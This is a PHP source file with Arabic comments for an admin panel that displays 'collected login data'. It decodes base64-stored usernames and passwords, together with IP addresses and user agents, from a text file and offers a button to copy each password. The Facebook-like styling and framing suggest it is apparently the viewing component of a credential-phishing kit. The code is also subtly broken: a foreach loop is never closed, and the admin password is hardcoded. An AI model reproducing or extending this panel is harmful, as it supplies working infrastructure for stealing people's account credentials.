<?php
/**
 * صفحة عرض بيانات تسجيل الدخول
 * هذه الصفحة مخصصة للمسؤول فقط لعرض البيانات المجمعة
 * 
 * تحذير: يجب تأمين هذه الصفحة بكلمة مرور قوية
 */

// التحقق من تسجيل دخول المسؤول (يجب تعديل هذا الجزء لإضافة نظام مصادقة حقيقي)
session_start();

// كلمة مرور للوصول (يجب تغييرها في الاستخدام الفعلي)
$admin_password = "change_this_password_now"; // قم بتغيير هذه كلمة المرور

// التحقق من تسجيل الدخول
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    // عرض نموذج تسجيل دخول المسؤول
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === $admin_password) {
            $_SESSION['admin_logged_in'] = true;
            header('Location: admin.php');
            exit;
        } else {
            $error = "كلمة المرور غير صحيحة";
        }
    }
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - عرض البيانات</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.34;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 20px;
        }

        h1 {
            color: #1877f2;
            margin-bottom: 20px;
            text-align: center;
        }

        .login-form {
            max-width: 400px;
            margin: 100px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
        }

        .login-form input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            margin-bottom: 12px;
        }

        .login-form button {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
        }

        .error-message {
            color: #f02849;
            text-align: center;
            margin-bottom: 12px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        th, td {
            border: 1px solid #dddfe2;
            padding: 12px;
            text-align: right;
        }

        th {
            background-color: #f0f2f5;
            font-weight: bold;
        }

        tr:nth-child(even) {
            background-color: #f9f9f9;
        }

        tr:hover {
            background-color: #f0f2f5;
        }

        .logout-btn {
            background-color: #f02849;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            line-height: 36px;
            padding: 0 16px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }

        .no-data {
            text-align: center;
            padding: 20px;
            color: #606770;
        }

        .data-count {
            text-align: center;
            margin-bottom: 20px;
            font-size: 18px;
            color: #606770;
        }

        .warning {
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <?php if (isset($error)): ?>
    <div class="login-form">
        <h1>تسجيل دخول المسؤول</h1>
        <div class="error-message"><?php echo $error; ?></div>
        <form method="post">
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    <?php else: ?>
    <div class="login-form">
        <h1>تسجيل دخول المسؤول</h1>
        <form method="post">
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    <?php endif; ?>
</body>
</html>
<?php
    exit;
}

// قراءة البيانات من الملف
$data_file = __DIR__ . '/data/login_data.txt';
$data = [];

if (file_exists($data_file)) {
    $lines = file($data_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

    // تخطي الأسطر التي تبدأ بـ # (التعليقات)
    foreach ($lines as $line) {
        if (strpos($line, '#') !== 0) {
            $data[] = $line;
        }
    }
}

// فك تشفير كلمات المرور للعرض
function decrypt_password($encrypted_password) {
    return base64_decode($encrypted_password);
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - عرض البيانات</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.34;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 20px;
        }

        h1 {
            color: #1877f2;
            margin-bottom: 20px;
            text-align: center;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        th, td {
            border: 1px solid #dddfe2;
            padding: 12px;
            text-align: right;
        }

        th {
            background-color: #f0f2f5;
            font-weight: bold;
        }

        tr:nth-child(even) {
            background-color: #f9f9f9;
        }

        tr:hover {
            background-color: #f0f2f5;
        }

        .logout-btn {
            background-color: #f02849;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            line-height: 36px;
            padding: 0 16px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
        }

        .no-data {
            text-align: center;
            padding: 20px;
            color: #606770;
        }

        .data-count {
            text-align: center;
            margin-bottom: 20px;
            font-size: 18px;
            color: #606770;
        }

        .warning {
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
            padding: 15px;
            border-radius: 6px;
            margin-bottom: 20px;
        }

        .copy-btn {
            background-color: #1877f2;
            border: none;
            border-radius: 4px;
            font-size: 12px;
            line-height: 24px;
            padding: 0 8px;
            color: #fff;
            cursor: pointer;
            margin-left: 5px;
        }

        .copy-btn:hover {
            background-color: #166fe5;
        }

        .password-cell {
            font-family: monospace;
            direction: ltr;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>بيانات تسجيل الدخول المجمعة</h1>

        <div class="warning">
            <strong>تحذير:</strong> هذه البيانات حساسة ويجب التعامل معها بحذر. تأكد من حماية هذه الصفحة بكلمة مرور قوية وتشفير الاتصال.
        </div>

        <div class="data-count">
            عدد السجلات: <?php echo count($data); ?>
        </div>

        <?php if (empty($data)): ?>
        <div class="no-data">
            لا توجد بيانات حتى الآن
        </div>
        <?php else: ?>
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>التاريخ والوقت</th>
                    <th>اسم المستخدم</th>
                    <th>كلمة المرور</th>
                    <th>عنوان IP</th>
                    <th>معلومات المتصفح</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($data as $index => $line): ?>
                <?php
                // تحليل البيانات
                preg_match('/\[(.*?)\] Username: (.*?) \| Password \(encrypted\): (.*?) \| IP: (.*?) \| User-Agent: (.*)/', $line, $matches);

                if (count($matches) >= 6) {
                    $timestamp = $matches[1];
                    $username = htmlspecialchars($matches[2]);
                    $encrypted_password = $matches[3];
                    $password = decrypt_password($encrypted_password);
                    $ip = htmlspecialchars($matches[4]);
                    $user_agent = htmlspecialchars($matches[5]);
                ?>
                <tr>
                    <td><?php echo $index + 1; ?></td>
                    <td><?php echo $timestamp; ?></td>
                    <td><?php echo $username; ?></td>
                    <td class="password-cell">
                        <?php echo htmlspecialchars($password); ?>
                        <button class="copy-btn" onclick="copyToClipboard('<?php echo htmlspecialchars($password); ?>')">نسخ</button>
                    </td>
                    <td><?php echo $ip; ?></td>
                    <td><?php echo $user_agent; ?></td>
                </tr>
                <?php } ?>
            </tbody>
        </table>
        <?php endif; ?>

        <div style="text-align: center;">
            <form method="post" action="logout.php">
                <button type="submit" class="logout-btn">تسجيل الخروج</button>
            </form>
        </div>
    </div>

    <script>
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(function() {
                alert('تم نسخ كلمة المرور إلى الحافظة');
            }, function(err) {
                console.error('فشل النسخ: ', err);
                alert('فشل نسخ كلمة المرور. يرجى النسخ يدوياً.');
            });
        }
    </script>
</body>
</html>
